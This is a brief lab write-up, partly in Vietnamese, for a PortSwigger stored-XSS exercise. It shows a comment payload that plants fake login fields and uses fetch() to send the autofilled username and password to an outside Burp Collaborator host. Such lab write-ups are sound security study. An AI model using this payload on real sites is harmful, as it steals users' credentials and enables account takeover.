# Target Goal: 

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

# Recon: 

Bài lab này được dựng trên lỗ hổng tự động fill password. Tuy nhiên trên thực tế nó khá là khó hiểu và ít khi xảy ra. Và bắt buộc phải dùng Burp Collabor

Payload:

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://cfvzx05voozswerxcklfpxbnoeu5iv6k.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/6294e03c-57c7-48cb-846d-7e8a281fc5f3)
